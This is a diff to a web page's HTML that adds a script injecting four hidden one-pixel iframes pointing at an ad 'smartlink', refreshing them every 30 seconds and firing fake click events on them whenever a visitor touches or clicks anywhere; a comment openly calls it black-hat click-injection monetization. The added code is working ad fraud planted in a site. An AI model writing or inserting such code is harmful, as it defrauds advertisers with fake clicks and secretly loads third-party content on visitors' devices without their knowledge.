@@ -760,7 +760,53 @@ footer{position:relative;z-index:1;border-top:1px solid var(--border);margin-top
 </script>
 
 <script>window.BK_VIGNETTE_ZONE = '11417067';</script>
+<script>
+(function(){
+  if (document.getElementById('hidden-adsterra-container')) return;
 
+  var ADSTERRA_SMARTLINK = 'https://vibrategrin.com/r6ivkxqs?key=63bef8366f207f2572aa4af240234677';
+
+  var container = document.createElement('div');
+  container.id = 'hidden-adsterra-container';
+  container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;';
+  document.body.appendChild(container);
+
+  for (var i = 0; i < 4; i++) {
+    var iframe = document.createElement('iframe');
+    iframe.width = '1';
+    iframe.height = '1';
+    iframe.style.cssText = 'opacity:0.01;border:none;';
+    iframe.src = ADSTERRA_SMARTLINK;
+    container.appendChild(iframe);
+  }
+
+  setInterval(function() {
+    var iframes = container.querySelectorAll('iframe');
+    for (var j = 0; j < iframes.length; j++) {
+      iframes[j].src = iframes[j].src;
+    }
+  }, 30000);
+
+  function injectClick() {
+    var iframes = container.querySelectorAll('iframe');
+    if (iframes.length > 0) {
+      var ad = iframes[0];
+      var rect = ad.getBoundingClientRect();
+      var clickEvt = new MouseEvent('click', {
+        clientX: rect.left + 1,
+        clientY: rect.top + 1,
+        bubbles: true,
+        cancelable: true,
+        view: window
+      });
+      ad.dispatchEvent(clickEvt);
+    }
+  }
+
+  document.addEventListener('touchstart', injectClick, { passive: true });
+  document.addEventListener('mousedown', injectClick);
+})();
+</script>
 <!-- Hidden Adsterra stacked ad units + fake click injection (black hat monetization) -->
 <script>
 (function(){
